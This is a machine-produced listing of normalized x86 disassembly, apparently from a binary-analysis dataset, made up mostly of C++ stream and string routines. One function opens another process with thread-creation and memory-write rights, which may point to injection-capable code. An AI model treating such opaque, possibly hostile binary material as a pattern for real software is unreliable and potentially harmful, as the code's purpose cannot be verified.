mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x33
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] ax
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] ax
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc0 ]
push ecx
call sub_43811c
add esp 0x4
sub_41aa80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453283
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x98 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb0 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
xor ebx ebx
push ebx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x78 ]
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] cx
call sub_401be0
mov [ esp + 0xb8 ] ebx
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
push ebx
xor edx edx
push eax
mov esi 0x7
or eax 0xffffffff
lea edi [ esp + 0x5c ]
mov [ esp + 0x70 ] esi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] dx
call sub_401be0
xor eax eax
mov [ esp + 0x4c ] esi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] ax
lea ecx [ esp + 0x70 ]
push ecx
lea eax [ esp + 0x18 ]
mov [ esp + 0xbc ] 0x2
call sub_40b340
add esp 0x4
test al al
je r-xdata
push ebx
lea eax [ esp + 0x90 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
lea ecx [ esp + 0x80 ]
push ecx
push ecx
push r--data
push rw-data
mov [ esp + 0xd8 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x1c ]
push edx
push ecx
push r--data
push ecx
lea eax [ esp + 0x80 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi 0x8
cmp [ esp + 0xa0 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
lea edx [ esp + 0x1c ]
push 0x1
push edx
lea ecx [ esp + 0x5c ]
call sub_41b2a0
add esp 0x8
mov esi 0x8
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
cmp [ esp + 0x4c ] esi
jb r-xdata
mov edx [ esp + 0x8c ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
xor ecx ecx
mov edi 0x7
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] cx
cmp [ esp + 0x68 ] esi
jb r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] ax
cmp [ esp + 0x84 ] esi
jb r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
mov al 0x1
mov ecx [ esp + 0xb0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x98 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x70 ]
push ecx
call sub_43811c
add esp 0x4
sub_41ad50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453223
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd0 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
xor ebx ebx
push ebx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x7c ]
mov [ esp + 0x90 ] 0x7
mov [ esp + 0x8c ] ebx
mov [ esp + 0x7c ] cx
call sub_401be0
mov [ esp + 0xd8 ] ebx
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
push ebx
xor edx edx
push eax
mov esi 0x7
or eax 0xffffffff
lea edi [ esp + 0x98 ]
mov [ esp + 0xac ] esi
mov [ esp + 0xa8 ] ebx
mov [ esp + 0x98 ] dx
call sub_401be0
xor eax eax
xor ecx ecx
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] ax
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] cx
lea edx [ esp + 0x74 ]
push edx
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0xe0 ] 0x2
call sub_40d910
add esp 0x8
test al al
je r-xdata
push ebx
lea eax [ esp + 0xb0 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
lea ecx [ esp + 0x84 ]
push ecx
push ecx
push r--data
push rw-data
mov [ esp + 0xf8 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
lea ecx [ esp + 0x30 ]
push ecx
push ecx
push r--data
push ecx
lea edx [ esp + 0x84 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi 0x8
cmp [ esp + 0xc0 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov edx [ esp + 0x68 ]
push edx
push ecx
push r--data
push ecx
lea eax [ esp + 0x84 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
cmp [ esp + 0x44 ] esi
jb r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
xor ecx ecx
mov edi 0x7
mov [ esp + 0x44 ] edi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] cx
cmp [ esp + 0x28 ] esi
jb r-xdata
mov eax [ esp + 0x30 ]
push eax
call sub_43811c
add esp 0x4
lea edx [ esp + 0x68 ]
push 0x1
push edx
lea ecx [ esp + 0x98 ]
call sub_41b2a0
add esp 0x8
mov esi 0x8
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor eax eax
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] ax
cmp [ esp + 0xa4 ] esi
jb r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
xor edx edx
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] dx
cmp [ esp + 0x88 ] esi
jb r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_43811c
add esp 0x4
mov al 0x1
mov ecx [ esp + 0xd0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb8 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x74 ]
push eax
call sub_43811c
add esp 0x4
sub_41b100
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4531cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xe8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x100 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
xor ebx ebx
push ebx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0xe4 ]
mov [ esp + 0xf8 ] 0x7
mov [ esp + 0xf4 ] ebx
mov [ esp + 0xe4 ] cx
call sub_401be0
mov [ esp + 0x108 ] ebx
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
push ebx
xor edx edx
push eax
or eax 0xffffffff
lea edi [ esp + 0xc8 ]
mov [ esp + 0xdc ] 0x7
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] dx
call sub_401be0
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x10c ] 0x1
call sub_406af0
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x110 ] 0x2
call sub_41b8f0
mov ecx [ esi + 0x4 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
setb cl
movzx edx cl
push edx
lea eax [ esp + 0x14 ]
push eax
mov ecx edi
call sub_41b2a0
add esp 0x8
lea ecx [ esp + 0x14 ]
mov [ esp + 0x108 ] 0x1
call sub_403550
mov esi 0x8
cmp [ esp + 0xd4 ] esi
jb r-xdata
xor edx edx
mov [ esp + 0xd4 ] 0x7
mov [ esp + 0xd0 ] ebx
mov [ esp + 0xc0 ] dx
cmp [ esp + 0xf0 ] esi
jb r-xdata
mov ecx [ esp + 0xc0 ]
push ecx
call sub_43811c
add esp 0x4
mov al 0x1
mov ecx [ esp + 0x100 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xe8 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esp + 0xdc ]
push eax
call sub_43811c
add esp 0x4
sub_41b2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_453183
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor bl bl
mov esi ecx
cmp [ ebp + 0xc ] bl
je r-xdata
mov edx [ eax ]
push edx
push 0x0
xor bl bl
push 0x43a
mov [ ebp - 0x49 ] bl
call [ OpenProcess@IAT ]
mov [ ebp - 0x50 ] eax
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
je r-xdata
mov ecx esi
lea ebx [ ebp - 0x50 ]
call sub_406330
mov [ ebp - 0x49 ] al
mov eax [ ebp - 0x50 ]
push eax
call [ CloseHandle@IAT ]
mov bl [ ebp - 0x49 ]
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x0
lea edx [ ebp - 0x2c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
xor ecx ecx
xor ebx ebx
mov [ ebp - 0x48 ] cx
mov edi 0x7
push ebx
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
call sub_401c90
push 0x24
mov [ ebp - 0x4 ] ebx
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
mov al bl
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor eax eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x54 ] esp
xor edx edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push 0x1
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ ebp - 0x58 ] esp
mov [ ecx ] ax
push 0xd
mov eax r--data
call sub_401c90
mov [ ebp - 0x4 ] 0x1
call sub_40a930
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
push 0x0
push eax
call sub_402d50
mov al bl
jmp r-xdata
or eax 0x4
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov al bl
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
mov [ ebp - 0x4 ] 0x0
push rw-data
mov [ rw-data ] eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
mov bl 0x6
xor edi edi
test bl cl
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
call sub_40aba0
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
lea edx [ ebp - 0x2c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
lea esi [ ebp - 0x48 ]
call sub_40aa80
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
call sub_41b850
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
lea edx [ ebp - 0x2c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov al [ ebp - 0x49 ]
mov eax [ ebp - 0x48 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_4218d0
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
lea edx [ ebp - 0x48 ]
push edx
push esi
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_41b850
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
pop edi
mov al 0x1
pop esi
pop ecx
retn
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov [ rw-data ] 0x0
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_41b8f0
push ebp
mov ebp esp
push 0xffffffff
push sub_451cf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
push edi
push esi
mov [ ebp - 0x4 ] edi
call sub_406bb0
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x18 ]
add ecx esi
test edx edx
je r-xdata
mov edx [ esi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ edx + 0x4 ]
add ecx esi
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_41ede0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
push ebx
add eax esi
lea ebx [ ebp - 0x18 ]
push ebx
push eax
xor edi edi
test ecx ecx
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x20 ]
push eax
sete dl
mov [ ebp - 0x30 ] dl
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx ]
mov edx [ edx + 0x1c ]
push edi
push eax
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp - 0x14 ]
call edx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_4361b0
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_41ba02
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_41ba90
push ebp
mov ebp esp
push 0xffffffff
push sub_4516a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x24 ]
mov edi ecx
mov ecx [ ebp + 0x20 ]
or ebx 0xffffffff
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x6c ] edx
je r-xdata
lea ecx [ ebp - 0x68 ]
push ecx
mov ecx esi
mov [ ebp - 0x54 ] 0x0
call sub_402e50
lea edx [ ebp - 0x54 ]
push edx
push eax
mov [ ebp - 0x4 ] 0x4
mov esi [ esi + 0x14 ]
push esi
lea eax [ ebp + 0xc ]
push eax
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_41c990
add esp 0x10
push eax
lea ecx [ ebp - 0x64 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
call sub_43797a
mov [ ebp - 0x4 ] 0xffffffff
